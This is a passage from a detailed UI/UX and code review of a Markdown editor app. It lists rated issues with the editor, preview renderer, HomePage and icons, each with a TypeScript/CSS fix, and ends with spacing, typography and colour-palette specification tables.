- **Problem:** `overflow: hidden` on a `<table>` does **not** create a scroll container. A 12-column table in split mode (≈352–560px of width) either blows out the layout or, because `width: 100%` forces it to shrink, crushes every cell to a few characters per line with no way to see the content. `.markdown-body pre` correctly gets `overflow-x: auto` (`index.css:369`); tables get nothing.
- **Fix:** Wrap every table in a scroll container in the renderer:
  ```ts
  table(token) { return `<div class="md-table-wrap" tabindex="0" role="region" aria-label="Table, scrollable">${this.parser.parse(token.tokens)}</div>`; }
  ```
  ```css
  .md-table-wrap { overflow-x: auto; border: 1px solid var(--border-default);
                   border-radius: var(--radius-lg); margin: 1.5rem 0; }
  .md-table-wrap table { width: 100%; min-width: 32rem; margin: 0; border: 0; border-radius: 0; }
  .md-table-wrap:focus-visible { outline: 2px solid var(--accent-400); outline-offset: 2px; }
  ```
  The `tabindex` + `role="region"` + label is required so keyboard users can actually scroll it.

#### [MEDIUM] MD11. Strikethrough, footnotes, definition lists, heading anchors, TOC — all missing
- **File:** `src/services/markdown.ts:4-7`
- **Problem:** `~~text~~` renders with no visual treatment beyond the default. `[^1]` footnotes are not supported by `marked` core and render as literal text. No heading anchors, no outline, no table of contents, no `target=_blank` external markers (MD8), no `<details>` support, no math. For an app whose own metadata (`index.html:7`) advertises "syntax highlighting" as a headline feature, the renderer's feature surface is minimal.
- **Fix:** Add, in order of value: heading anchors + a collapsible outline in the preview gutter; `~~del~~ { text-decoration: line-through; text-decoration-color: var(--text-tertiary); text-decoration-thickness: 1.5px }`; footnotes via `marked-footnote`; and an "Insert Table of Contents" command.

#### [MEDIUM] MD12. Task-list toggling can corrupt fenced code blocks
- **File:** `src/components/MarkdownPreview.tsx:65-75`
- **Current:**
  ```tsx
  const regex = /^(\s*[-*+]\s*\[)([ xX])(\])/gm;
  const updated = content.replace(regex, (match, prefix, state, suffix) => { … });
  ```
- **Problem:** The regex has no awareness of fenced code blocks. A markdown file containing a task-list example inside a ``` fence gets rewritten when the user toggles *any* checkbox in the real list above it — the source is silently corrupted, and the corruption is then saved to disk.
- **Fix:** Do the toggle positionally via a marker attribute emitted by the renderer, not by re-parsing:
  ```ts
  listitem(token) {
    // emit data-task-index="N" on checkboxes, tracked per-render
  }
  ```
  Then map the DOM index back to the *rendered* list item index and rewrite only that line, after skipping any line inside a fence:
  ```ts
  const lines = content.split('\n');
  let inFence = false, idx = -1;
  for (let i = 0; i < lines.length; i++) {
    if (/^\s*(```|~~~)/.test(lines[i])) inFence = !inFence;
    else if (!inFence && /^\s*[-*+]\s*\[[ xX]\]/.test(lines[i])) {
      if (++idx === target) lines[i] = lines[i].replace(/\[([ xX])\]/, (m, s) => `[${s === ' ' ? 'x' : ' '}]`);
    }
  }
  onContentChange(lines.join('\n'));
  ```

#### [LOW] MD13. The "Copy" label mutates the DOM and React clobbers it
- **File:** `src/components/MarkdownPreview.tsx:89-99`
- **Problem:** `span.textContent = 'Copied!'` mutates the DOM inside a `dangerouslySetInnerHTML` subtree. React does not own those nodes, so this is safe *until* the next re-render — and `htmlContent` changes on every keystroke. Type a character within the 1.8s window and "Copied!" vanishes mid-confirmation.
- **Fix:** Toggle a class instead of the text, and drive both from CSS: `copyBtn.classList.add('is-copied')` with
  ```css
  .copy-code-btn .label-copy::after { content: 'Copy'; }
  .copy-code-btn.is-copied .label-copy::after { content: 'Copied'; }
  ```
  Also add `role="status"` on the button so the change is announced.

#### [LOW] MD14. Emoji in a professional Windows app
- **File:** `MarkdownPreview.tsx:127` (`📝`), `markdown.ts:21` (`🔍 Click to zoom`)
- **Problem:** These render as full-colour Segoe UI Emoji glyphs amid 99 monochrome lucide outline icons — a visible clash in style, weight and baseline. `📝` is also 24px next to a `text-sm` label with no optical alignment.
- **Fix:** `<FileText className="w-6 h-6" aria-hidden="true" />` and `Click to zoom` with a `Maximize2` glyph at `w-3 h-3`.

---

### Editor quality

**`RawEditor` is a plain `<textarea>` with a hand-rolled line-number gutter.** No syntax highlighting of markdown source, no current-line highlight, no active-line highlight, no minimap, no folding, no bracket matching, no multi-cursor, no selection info, no autocompletion, no typewriter/focus mode, no breadcrumbs. For a *Markdown* editor this is the central weakness — the user writes prose with markup and gets a Notepad textarea with numbers.

#### [HIGH] E1. The gutter re-renders one DOM node per line on every keystroke
- **File:** `src/components/RawEditor.tsx:44-46`, `:332-336`
- **Current:**
  ```tsx
  const lines = React.useMemo(() => content.split('\n'), [content]);
  …
  {lines.map((_, i) => (<div key={i} className="h-6">{i + 1}</div>))}
  ```
- **Problem:** `content` changes on every character, so the memo invalidates and React reconciles **one `<div>` per line**. A 3,000-line document = 3,000 element diffs per keystroke, plus 3,000 `key={i}` index keys. This is the second-largest jank source after `highlightAuto` (MD7) and it runs on every character *even when the line count is unchanged*.
- **Fix:** Only the *rendered window* needs to exist:
  ```tsx
  const [scrollTop, setScrollTop] = useState(0);
  const total = useMemo(() => content.split('\n').length, [content]);
  const LH = 24;
  const first = Math.max(0, Math.floor(scrollTop / LH) - 20);
  const last = Math.min(total, first + Math.ceil(viewportH / LH) + 40);
  // …
  <div className="relative" style={{ height: total * LH }}>
    <div style={{ transform: `translateY(${first * LH}px)` }} className="tabular-nums text-right">
      {Array.from({ length: last - first }, (_, k) => first + k + 1)}
    </div>
  </div>
  ```
  Or, decisively: **replace the textarea with CodeMirror 6** (`@codemirror/lang-markdown` gives real markdown tokenization, folding, bracket matching and a maintained accessibility model) — see the benchmark below.

#### [HIGH] E2. The gutter width is fixed but the font size is not
- **File:** `RawEditor.tsx:327`, `:330`
- **Current:** `className="w-12 py-4 select-none text-right pr-3 border-r …"` + `style={{ fontSize: `${fontSize}px` }}`
- **Problem:** `w-12` = 48px minus `pr-3` (12px) = **36px** of usable width. In Cascadia Mono, a digit is `0.6em`, so 36px fits `36 / (0.6 × fontSize)` digits → 6 digits at 10px, **4 digits at 15px, and only 3 at 20px**. At the zoom maximum of 32px it fits **one** digit: every line number past line 9 is clipped. The gutter width must be derived from the digit count.
- **Fix:**
  ```tsx
  <div className="shrink-0 select-none tabular-nums text-right border-r
                  bg-[var(--surface-1)] text-[var(--text-tertiary)]"
       style={{ width: gutterWidth, fontSize: `${fontSize}px` }}>
  ```
  ```ts
  const digits = String(lines.length).length;
  const gutterWidth = Math.ceil(digits * fontSize * 0.62) + 24;  // 24 = 12px pad + 12px gap
  ```
  Also drop the redundant `text-xs` (the inline `fontSize` overrides it anyway) and the redundant `leading-relaxed` on the gutter — the children have explicit `h-6`, so line-height there is dead weight and a future source of misalignment.

#### [HIGH] E3. `scrollToLine` selects the whole line and uses a hardcoded line height
- **File:** `src/components/RawEditor.tsx:73-94`
- **Current:**
  ```tsx
  textarea.setSelectionRange(charIndex, charIndex + lineLength);
  // Approximate line height ~24px
  const lineHeight = 24;
  textarea.scrollTop = Math.max(0, (lineNumber - 5) * lineHeight);
  ```
- **Problem:** (a) **It selects the entire line**, so jumping from a HomePage search snippet (`HomePage.tsx:267` → `onOpenFileById(file.id, snip.lineNumber)`) selects the whole line — and the user's next keystroke destroys it. It should place a caret. (b) `lineLength` is selected but `charIndex + lineLength` can exceed the string when the line is the last one without a trailing newline. (c) The magic `24` duplicates `lineHeight: '1.5rem'` at `:358` and `h-6` at `:333` — three copies of the same constant that must stay in sync by hand.
- **Fix:**
  ```tsx
  const scrollToLine = useCallback((line: number) => {
    const ta = textareaRef.current; if (!ta) return;
    const linesArr = content.split('\n');
    const idx = Math.max(0, Math.min(line - 1, linesArr.length - 1));
    let at = 0; for (let i = 0; i < idx; i++) at += linesArr[i].length + 1;
    ta.focus();
    ta.setSelectionRange(at, at);                       // caret, not selection
    const lh = parseFloat(getComputedStyle(ta).lineHeight);   // measured, not assumed
    ta.scrollTop = Math.max(0, (idx - 5) * lh);
    lineNumbersRef.current && (lineNumbersRef.current.scrollTop = ta.scrollTop);
    updateCursorPosition();
  }, [content]);
  ```

#### [HIGH] E4. Cursor position is stale — bound only to `keyup` and `click`
- **File:** `RawEditor.tsx:345-346`
- **Current:**
  ```tsx
  onKeyUp={updateCursorPosition}
  onClick={updateCursorPosition}
  ```
- **Problem:** Mouse drag-selection, `Shift+Arrow`, `Home`/`End`, `PageUp`/`PageDown`, middle-click paste, and the undo stack never update `Ln/Col`. The status bar lies. `updateCursorPosition` also reads the `content` **prop**, which inside the `setTimeout` at `:119-122` and `:152-159` is the *previous* render's value, so it computes the wrong column after any programmatic insert.
- **Fix:** `onSelect={updateCursorPosition}` (fires for mouse, keyboard, and programmatic selection changes) and read from the DOM instead of the stale prop:
  ```tsx
  const updateCursorPosition = useCallback(() => {
    const ta = textareaRef.current; if (!ta || !onCursorChange) return;
    const pos = ta.selectionStart;
    const before = ta.value.slice(0, pos);
    onCursorChange(before.split('\n').length, pos - before.lastIndexOf('\n'));
  }, [onCursorChange]);
  ```
  Keep `onSelect` and drop `onKeyUp`/`onClick` (both are subsets of it).

#### [HIGH] E5. Undo/redo is unreliable and undocumented
- **File:** whole editor
- **Problem:** There is no `Ctrl+Z` / `Ctrl+Y` handler anywhere. The textarea is fully controlled (`value={content}`, `RawEditor.tsx:342`) with the value round-tripping through React state on every character, which clobbers Chromium's native undo stack. The programmatic mutations make it worse: `insertFormatting` (`:152-159`) restores the selection in a `setTimeout`, `handleReplaceCurrent` (`:218-224`) does one whole-document rewrite, and `handleReplaceAll` (`:227-231`) uses `content.replaceAll(...)` — so "Replace All" is a **single** undo step that wipes every prior edit. "Undo" is not even listed in `ShortcutsModal.tsx:16-89`.
- **Fix:** Move history into an explicit stack with coalescing, so undo is guaranteed and semantics are sane:
  ```ts
  // useDocumentHistory.ts
  const past = useRef<string[]>([]), future = useRef<string[]>([]);
  const commit = (next: string, { coalesceKey } = {}) => {
    if (next === cur) return;
    if (coalesceKey && lastKey.current === coalesceKey) { /* don't push */ }
    else { past.current.push(cur); if (past.current.length > 200) past.current.shift(); }
    future.current.length = 0;
    lastKey.current = coalesceKey; cur = next; onChange(next);
  };
  ```
  Coalesce by `"type:" + line` for typing, push unconditionally for `replaceAll` and for each `replaceCurrent`. Bind `Ctrl+Z` / `Ctrl+Shift+Z` / `Ctrl+Y`. Also record a snapshot on tab switch and on `Ctrl+S`.

#### [MEDIUM] E6. Tab inserts two spaces blindly
- **File:** `RawEditor.tsx:110-122`
- **Problem:** No `Shift+Tab` dedent, no multi-line indent, no indent-aware unindent (if the caret sits inside leading whitespace, Tab should move to the next tab stop, not insert). Fix per A7.

## 6b. UI/UX — HomePage, Iconography & Design Specification

#### [MEDIUM] E7 (completed). `Ctrl+B` / `Ctrl+I` only work when the textarea has focus, and are listed globally
- **File:** `RawEditor.tsx:131-137`; `CommandBar.tsx:224,231`; `ShortcutsModal.tsx:58-66`
- **Problem:** Handlers live on the `<textarea>`'s `onKeyDown`; dead in preview mode while tooltips/shortcuts modal advertise them globally.
- **Fix:** Move `Ctrl+B/I/F/H` to the global handler at `App.tsx:641-672`, dispatching to `editorRef.current` and switching `preview`→`split` first (reuse the pending-insert mechanism from I12):
```tsx
// App.tsx:641-672 — add branches
} else if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'b') { e.preventDefault(); queueInsert('**', '**', 'bold text'); }
else if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'i') { e.preventDefault(); queueInsert('*', '*', 'italic text'); }
else if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'f') { e.preventDefault(); if (activeTab?.viewMode === 'preview') handleChangeViewMode('split'); requestAnimationFrame(() => editorRef.current?.focusFind(false)); }
else if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'h') { e.preventDefault(); if (activeTab?.viewMode === 'preview') handleChangeViewMode('split'); requestAnimationFrame(() => editorRef.current?.focusFind(true)); }
// RawEditor: expose focusFind(showReplace: boolean) on the imperative handle; delete the textarea-local Ctrl+B/I/F/H branches (RawEditor.tsx:123-137).
```

### HomePage critique

#### [HIGH] HP1. Typing one character destroys the entire page layout
- **File:** `src/components/HomePage.tsx:303,361` (`{!searchQuery && pinnedFiles.length > 0 && (…)}`, `{!searchQuery && (…history…)}`)
- **Problem:** Results render *instead of* pinned + history, so the first keystroke deletes two sections, moves every remaining element, and loses the user's scroll position. Clearing the query rebuilds a different layout again.
- **Fix:** Never unmount sections on query. Render results in a dedicated panel directly under the search field (`HomePage.tsx:191-299`) and dim (not remove) the sections below with `aria-hidden={!searchQuery}` + `inert={!searchQuery}` semantics.

#### [HIGH] HP2. Three CTAs in three different sizes
- **File:** `HomePage.tsx:113` (`px-4 py-2.5 … hover:scale-[1.02]`), `:122` (`px-4 py-2.5`), `:135` (`px-3.5 py-2.5`)
- **Problem:** Primary/secondary/tertiary differ by 2px of padding, and the primary *scales* on hover (`hover:scale-[1.02]`) — layout-adjacent transform on the most-clicked button in the app.
- **Fix:** All three `h-10 px-4 rounded-lg text-xs font-medium`; delete `hover:scale-[1.02]`; demote Sample Library to ghost (`border-transparent bg-transparent hover:bg-[var(--surface-3)]`).

#### [HIGH] HP3. Search field is oversized and its placeholder is a sentence
- **File:** `HomePage.tsx:167` (`w-4.5 h-4.5`), `:172` (placeholder `"Search across all indexed Markdown files (type keywords like 'consensus', 'guide', …)"`), `:173` (`pl-11 pr-24 py-3.5 rounded-2xl shadow-inner`)
- **Problem:** 130-char placeholder truncates mid-word at ≤1280px; `py-3.5` + `rounded-2xl` makes a 52px-tall input for 14px text; `shadow-inner` inverts the elevation cue (pressed-in = disabled).
- **Fix:** `className="h-11 w-full rounded-lg border pl-10 pr-20 text-sm …"`; placeholder `"Search files and content…"`; icon `w-4 h-4 left-3.5`. Delete `shadow-inner`.

#### [MEDIUM] HP4. Gradient page background vs flat app chrome
- **File:** `HomePage.tsx:72-76` (`bg-gradient-to-b from-slate-50 via-slate-100 to-slate-200/50` / `from-slate-900/60 to-slate-950`)
- **Problem:** Home renders as a different product from the editor (flat `bg-slate-950`/`bg-white`). The 3-stop light gradient bands visibly at 1440p.
- **Fix:** `bg-[var(--surface-1)]` flat, both themes. Differentiate with surface, not gradient.

#### [MEDIUM] HP5. Logo chip is the heaviest element on the page
- **File:** `HomePage.tsx:83-88` (`p-2.5 rounded-2xl border shadow-lg` + `AppLogo size={58} className="w-14 h-14"`)
- **Problem:** 56px mark + gradient chip + `shadow-lg` + sky/indigo tinted gradient (`:85-86`) competes with the document list for attention.
- **Fix:** `p-2 rounded-xl border border-[var(--border-subtle)] bg-[var(--surface-2)] shadow-none`, logo `size={40} className="w-10 h-10"`.

#### [MEDIUM] HP6. Result card is triple-nested boxes
- **File:** `HomePage.tsx:216` (`p-4.5 rounded-2xl shadow-md`), `:259-261` (`p-3 rounded-xl bg-slate-950/80`), `:269` (`p-1 rounded hover:bg-sky-500/10`)
- **Problem:** Card → inset panel → hover row. Three borders, three radii, two shadows in one list item; `p-4.5` is off-scale.
- **Fix:** Card `p-4 rounded-lg border shadow-1`; snippet container `mt-2 rounded-md bg-[var(--surface-1)] p-2` with no border; row `px-2 py-1.5 rounded`.

#### [MEDIUM] HP7. Match-count badge uses sub-pixel padding
- **File:** `HomePage.tsx:233` (`text-[10px] px-2 py-0.2 rounded-full font-mono border`)
- **Problem:** `py-0.2` = 0.8px — rounds to 1px in Chromium, 0 in some zoom levels; 10px text is the legibility floor breach from T1.
- **Fix:** `text-2xs px-2 py-0.5 rounded-full font-mono` (11px min).

#### [MEDIUM] HP8. Excerpt truncation appends a hardcoded `...`
- **File:** `HomePage.tsx:345` (`{file.content.replace(/^#+\s+/gm, '').substring(0, 140)}...`)
- **Problem:** Always shows `...` even when content < 140 chars; truncates mid-word; strips `#` but leaves `*`, `>`, `[]()` markup visible.
- **Fix:** `{excerpt}` where `excerpt = plain.slice(0, 140).replace(/\s+\S*$/, '') + (plain.length > 140 ? '…' : '')`; keep `line-clamp-2` (`:344`) as the visual clamp.

#### [LOW] HP9. File History table hides columns instead of adapting
- **File:** `HomePage.tsx:425-427` (`hidden md:table-cell` / `hidden sm:table-cell`), `:486,492`
- **Problem:** At <768px the table is filename + actions only; path/metrics vanish with no affordance; thead isn't sticky so a 50-row history loses its headers.
- **Fix:** `thead className="sticky top-0 …"`; below `lg` collapse each row to two-line stacked cell (name + path) instead of hiding columns; keep one `md:` breakpoint total.

### Iconography

#### [MED] IC1. Eight distinct icon sizes; two clusters 14px vs 16px in one toolbar
- **File:** `CommandBar.tsx:91,102,123,135,330,340` (`w-4 h-4`) vs `:161,176,191,226-303,319,354,367` (`w-3.5 h-3.5`); `HomePage.tsx:167` (`w-4.5 h-4.5`), `:275` (`w-3 h-3`); `MarkdownPreview.tsx:124` (`w-12 h-12` container); `TitleBar.tsx:148` (`w-3.5`); `App.tsx:776` (`w-14 h-14`)
- **Problem:** Measured set: 12, 14, 16, 18, 20, 22, 48, 56px. The 14px middle cluster vs 16px outer clusters (S2) is visible at a glance.
- **Fix:** Three sizes only — `w-3.5` dense toolbar, `w-4` default, `w-5` empty states/hero. Delete `w-4.5`, `w-3`→`w-3.5`, `w-5.5`→`w-4`.

#### [MED] IC2. `fill-*` on the theme toggle; legitimate `fill` on Star
- **File:** `TitleBar.tsx:121` (`fill-amber-500`), `:123` (`fill-sky-400`) vs `HomePage.tsx:308,340,452` (`fill-amber-500` on Star)
- **Problem:** Filled Sun/Moon render as solid discs at 16px, a different family from 99 outline glyphs. Star fill is correct (it encodes pinned state).
- **Fix:** Delete both `fill-*` on Sun/Moon; keep `text-[var(--accent-400)]` / `text-amber-500` only.

#### [MED] IC3. Stroke width is consistent — protect it
- **File:** `AppLogo.tsx:77,104,113,123` are the *only* `strokeWidth` overrides in the repo; every lucide glyph uses the default 2.
- **Problem:** None currently — but the hand-rolled SVG in MD/IC4 re-declares `stroke-width="2"` by hand, so a future lucide upgrade to 1.75 would silently diverge.
- **Fix:** No change to lucide usage; replace the hand-rolled copy path with `<Copy className="w-3.5 h-3.5" />` so the width tracks the library.

#### [MED] IC4. Hand-rolled copy glyph duplicates lucide's `Copy` path verbatim
- **File:** `src/services/markdown.ts:62-64` (`<svg … stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8…"/>`)
- **Problem:** Same path data as lucide `Copy`, maintained separately, with no `aria-hidden` and no size token.
- **Fix:** Emit `<span class="copy-code-btn__icon" aria-hidden="true">` and inject the real `<Copy>` via the click-delegation already in `MarkdownPreview.tsx:84-103`, or inline lucide's current `copy` SVG with `class="w-3.5 h-3.5"` + `aria-hidden="true"`.

#### [MED] IC5. AppLogo is over-engineered for a 22px render and has colliding gradient IDs
- **File:** `src/components/AppLogo.tsx:18-64` (5 gradients + 3 `feDropShadow` filters); rendered at `size={22}` (`TitleBar.tsx:45`) and `size={58}` (`HomePage.tsx:88`)
- **Problem:** At 22px the radial gradient, neon glow, fold corner and accent gem collapse into blur; `id="fluent-radial"` etc. are document-global, so TitleBar + HomePage mounted together (every home view) duplicate IDs — second instance resolves to the first's defs.
- **Fix:** `const uid = useId()` and suffix every `id`/`url(#…)`; add a simplified `<g>` for `size <= 24` (flat rounded square + single `M` path, no filters).

#### [MED] IC6. Semantically wrong or colliding glyphs
- **File:** `App.tsx:776` (`UploadCloud` on a *drop* target); `CommandBar.tsx:135` + `:367` (`FileDown` for both Save As and Export); `CommandBar.tsx:176` + `:268` (`Code` for both Raw view-mode and inline-code insert); `FileText` ×10+ (rows, empty states, export card)
- **Problem:** `UploadCloud` implies uploading to a server; `FileDown`×2 makes Save As and Export indistinguishable in muscle memory; `Code`×2 conflates a pane with an action.
- **Fix:** Drop target → `ArrowDownToLine`; Export → `Share2` (header) + keep `FileDown` for Save As only; inline-code insert → `SquareCode`/`Braces`; file rows keep `FileText`, empty states use `FilePlus2`.

#### [MED] IC7. Dead icon imports promise dead features
- **File:** `CommandBar.tsx:21` (`Printer` imported, never rendered); `HomePage.tsx:5-11` (`HardDrive`, `ExternalLink`, `Laptop`, `CheckCircle` imported, never rendered)
- **Problem:** An unused `Printer` import next to a toolbar with no print button; four unused imports in the file whose subtitle advertises "Full-Text Search" and "Permanent File History".
- **Fix:** Delete all five imports. If print returns, render it; don't import it.

#### [MED] IC8. Caption trio mismatched 2px within one control group
- **File:** `TitleBar.tsx:139` (`Minus w-4`), `:148` (`Square w-3.5`), `:159` (`X w-4`)
- **Problem:** Maximize glyph is 14px between two 16px siblings; the `Square` outline at 2px stroke reads heavier than Win11's 1px caption glyphs.
- **Fix:** All three `w-3.5 h-3.5`, `strokeWidth={1.5}`, in the `w-11 h-11` buttons from S5.

### Missing / weak visual features

| Feature | Status | Notes / location |
|---|---|---|
| Line numbers | WEAK | Present but fixed `w-12`, clips ≥4 digits, 2.34:1 light (E2, C1) |
| Minimap | MISSING | No overview for long docs; gutter virtualization (E1) is the prerequisite |
| Breadcrumbs | MISSING | Only static mono path text (`StatusBar.tsx:54`, `TitleBar.tsx:64`) |
| Split-view modes | WEAK | Preview/Raw/Split exist but locked 50/50, no drag, no <760px collapse (S3, R1) |
| Word-wrap toggle | OK | Works (`CommandBar.tsx:309-321`) but state not persisted, 3.37:1 "on" state (C7) |
| Zoom control | WEAK | 2px steps, 11–32 range, body-text only, breaks `rem` headings (T5, T6, U7) |
| Theme switcher | WEAK | Two hardcoded themes; `dark:` follows OS not toggle (U2); 1 of 5 modals theme-blind |
| Focus / typewriter mode | MISSING | No distraction-free writing surface |
| Custom accent colour | MISSING | `AccentColor` type + 3 CSS vars + setting all dead (`types/index.ts:55`, `storage.ts:14`, `index.css:6-8`) |
| Find/replace bar | WEAK | `RawEditor.tsx:240-322`: no regex/case/word toggles, no in-text highlight, `w-48` fixed inputs |
| Outline / heading sidebar | MISSING | No anchors, no TOC, no minimap-of-headings (MD11) |
| Status bar | WEAK | Fabricated CRLF, stale Ln/Col in preview, nothing clickable (I11) |
| Drag-drop affordance | WEAK | Full-screen dashed overlay + `animate-bounce` 56px icon (`App.tsx:774-779`); counter can stick |
| Empty-document state | WEAK | Emoji + one hint line (`MarkdownPreview.tsx:119-137`); no shortcut hints, no template starter |
| Autosave | MISSING | `autoSave` setting dead (`storage.ts:20`); unsaved work lost on tab close (I2) |
| Undo/redo | MISSING | No handler, no history model (E5) |
| External-link handling | MISSING | Links navigate the window away (MD8) |
| Table overflow | MISSING | Wide tables crush with no scroll container (MD10) |
| Print stylesheet | MISSING | `window.print()` prints the whole app chrome (see QUICK WINS 15) |

## SPACING/LAYOUT MAP

| Region | File:line | Current | Proposed | Rationale |
|---|---|---|---|---|
| App root | `App.tsx:769` | `flex flex-col`, no `relative` | add `relative` | anchors `absolute inset-0` overlays (S7) |
| TitleBar | `TitleBar.tsx:37` | `h-[42px] px-3.5` | `h-11 px-4` | on-scale + one shared inset (S1) |
| TitleBar search | `TitleBar.tsx:77` | `h-7.5 px-3 rounded-lg` | `h-8 px-3 rounded-lg` | on-scale |
| Caption buttons | `TitleBar.tsx:130-161` | `w-10 h-10`, `ml-1` | `w-11 h-11`, `ml-0` | 44px targets, no 1px seam (S5) |
| TabBar | `TabBar.tsx:25` | `h-[42px] px-2.5 gap-1.5` | `h-11 px-4 gap-1` | aligns with TitleBar/CommandBar |
| Tab | `TabBar.tsx:31,60` | `px-3.5 py-2 rounded-t-lg` | `h-9 px-3 rounded-md` + 2px bottom accent on active | kills `rounded-t` + `border-t-2` pair |
| Tab close | `TabBar.tsx:96` | `w-5.5 h-5.5` | `w-7 h-7` | 28px target (I5) |
| CommandBar | `CommandBar.tsx:79` | `h-10 px-3 gap-2` | `h-10 px-4 gap-2` | one shared inset |
| CmdBar groups | `CommandBar.tsx:83` | `gap-1.5` | `gap-1` | correct at 28px control height |
| View segment | `CommandBar.tsx:147-194` | `p-0.5`, inner 22px | `h-7 p-0.5` wrapper, inner `h-6 px-2` | uniform 28px row (S2) |
| Format buttons | `CommandBar.tsx:221-304` | `p-1` (22px) | `w-7 h-7` | 28px targets |
| Right cluster | `CommandBar.tsx:308-342` | `p-1.5` (26px) | `w-7 h-7` | one height for the row |
| Split panes | `App.tsx:895,907` | `w-1/2` + `divide-x` | `var(--split)` + 1px separator, surfaces differ | resizable, perceivable (S3) |
| Preview pad | `MarkdownPreview.tsx:144` | `p-6 md:p-10` | `px-8 py-10`, split mode `py-4 px-4` | measure + column alignment (T2, S8) |
| Gutter | `RawEditor.tsx:327` | `w-12 pr-3 py-4` | computed width + 24px, `py-4` | digit-count derived (E2) |
| Editor pad | `RawEditor.tsx:350` | `py-4 px-4` | keep, match preview in split | shared left edge (S8) |
| StatusBar | `StatusBar.tsx:26` | `h-8 px-3.5 gap-3` | `h-8 px-4 gap-3` | one shared inset |
| Status dividers | `StatusBar.tsx:52,77,79` | `h-3.5 w-px` | `h-4 w-px` | optical centre in `h-8` |
| Home root | `HomePage.tsx:72` | `p-6 md:p-10`, `space-y-8` | `p-6 md:p-8`, `space-y-6` | tighter, consistent |
| Home CTAs | `HomePage.tsx:113,122,135` | `py-2.5`, `px-4/px-4/px-3.5` | `h-10 px-4` ×3 | one button spec (HP2) |
| Home search | `HomePage.tsx:173` | `pl-11 pr-24 py-3.5 rounded-2xl` | `h-11 pl-10 pr-20 rounded-lg` | on-scale (HP3) |
| Pinned grid/cards | `HomePage.tsx:312,317` | `gap-4`, `p-4.5 rounded-2xl` | `gap-3`, `p-4 rounded-lg` | one card spec (S9) |
| Card footer | `HomePage.tsx:348` | `mt-4 pt-3` | `mt-3 pt-3` | match header rhythm |
| History table | `HomePage.tsx:423-440` | `th py-3`, `td py-3.5` | `th h-10 px-4`, `td px-4 py-3` | one vertical rhythm |
| Modal chrome | `ExportModal.tsx:70,108,193,235,248` | `p-5 / p-4 / px-5 / p-5 / p-4` | header+body `p-6`, footer `p-4` | 4 paddings in one file → 2 |
| Lightbox | `ImageLightboxModal.tsx:40,85,95` | `py-2.5 px-4 / p-4 / py-2 px-4` | `h-11` bar, `p-6` canvas | one bar height for all overlays |
| Toast | `App.tsx:926` | `bottom-4 right-4 px-4 py-2.5` | `bottom-6 right-6 px-4 py-3` | clear of status bar at 200% zoom |

## TYPOGRAPHY SPEC

| Role | Size | Line-height | Weight | Letter-spacing | Used in |
|---|---|---|---|---|---|
| App / page title | 28px `text-3xl` | 34px | 700 | −0.02em | HomePage hero (`HomePage.tsx:92`) |
| Section heading | 16px `text-md` | 24px | 600 | −0.01em | Modal titles, history header, palette groups |
| Toolbar / button label | 12px `text-xs` | 16px | 500 (600 active) | 0 | CommandBar, tabs, table body |
| UI body | 13px `text-sm` | 20px | 400 | 0 | StatusBar primary, card excerpts, modal copy |
| Secondary text | 13px | 20px | 400 | 0 | `text-secondary`, subtitles, empty-state copy |
| Tertiary / metadata | 12px | 16px | 400 | 0 | Paths, counts, footers, timestamps |
| Micro / badge / kbd | 11px `text-2xs` | 14px | 600 | +0.04em, uppercase for badges | Match counts, version badge, `kbd`, footer hints |
| Editor body | 16px default (13–26 zoom) | 1.7 | 400 mono | 0 | `RawEditor` textarea + gutter (`tabular-nums`) |
| Preview body | 16px (`--preview-fs`) | 1.7 | 400 | 0 | `.markdown-body`, `max-w-[68ch]`, `text-wrap: pretty` |
| Preview H1 | 2.1em (33.6px) | 1.25 | 700 | −0.02em | First heading, `margin-block: 3rem .75rem` |
| Preview H2 | 1.6em (25.6px) | 1.3 | 700 | −0.015em | `margin-block: 2.5rem .625rem` |
| Preview H3 | 1.32em (21.1px) | 1.35 | 600 | −0.01em | `margin-block: 2rem .5rem` |
| Preview H4–H6 | 1.14em (18.2px) | 1.4 | 600 | 0 | `margin-block: 1.5rem .375rem` |
| Inline code | 0.9em | 1.5 | 500 mono | 0 | Backtick spans, kbd-adjacent values |
| Code block | 0.9em | 1.65 | 400 mono | 0 | Fenced blocks, `tabular-nums` for gutter |
| Status figures | 12px mono | 16px | 500 | 0 | Ln/Col, word count, UTF-8, EOL — all `tabular-nums` |

Rules: no size below 11px anywhere; only **one** of 10/11px (`text-2xs`); all `em` inside preview so zoom (U7) works; uppercase labels always carry letter-spacing.

## COLOR PALETTE PROPOSAL

Dark theme — surfaces on `--surface-1 #0E1420` unless noted:

| Token | Hex | Ratio vs bg | Use |
|---|---|---|---|
| `--surface-0` | `#0A0E17` | — | App base, editor pane, solid-button text |
| `--surface-1` | `#0E1420` | — | Chrome, preview pane, inputs |
| `--surface-2` | `#141B2B` | — | Cards, tab strip, popovers |
| `--surface-3` | `#1B2436` | — | Hover, code inline bg |
| `--surface-4` | `#232E42` | — | Pressed, selected row |
| `--border-subtle` | `#1B2436` | 1.24 (decorative) | Card hairlines only |
| `--border-default` | `#26314A` | 1.42 (decorative) | Pane/section dividers |
| `--border-strong` | `#35425F` | 1.84 (decorative) | Input borders, focus-adjacent |
| `--text-primary` | `#E6EDF7` | **15.64** | Headings, body, tab labels |
| `--text-secondary` | `#A9B6CB` | **8.99** | Subtitles, chrome icons, descriptions |
| `--text-tertiary` | `#7C8AA3` | **5.28** (4.93 on surf-2) | Metadata, paths, placeholders, gutter |
| `--text-disabled` | `#55627A` | ~3.3 non-text | Disabled labels only, never for info |
| `--accent-300` | `#7DD3FC` | **10.31** on surf-2 | Accent text on dark cards |
| `--accent-400` | `#38BDF8` | **8.60** | Links, active icons, focus ring |
| `--accent-500` | `#0EA5E9` | **6.96** w/ surf-0 text | Solid buttons, sync-scroll pill, separator hover |
| `--accent-600` | `#0284C7` | UI-only | Large-area fills, never 12px text |
| `--success-400` | `#34D399` | **8.94** on surf-2 | Saved, synced, copied |
| `--warning-400` | `#FBBF24` | **10.30** on surf-2 | Dirty dot, unsaved |
| `--danger-400` | `#F87171` | **6.22** on surf-2 | Delete, destructive |
| `--code-bg` | `#080C14` | — | Code block body (replaces `#0d1117`/`#090d16`) |
| `--code-header` | `#0E1420` | — | Code block bar (one frame, MD5) |
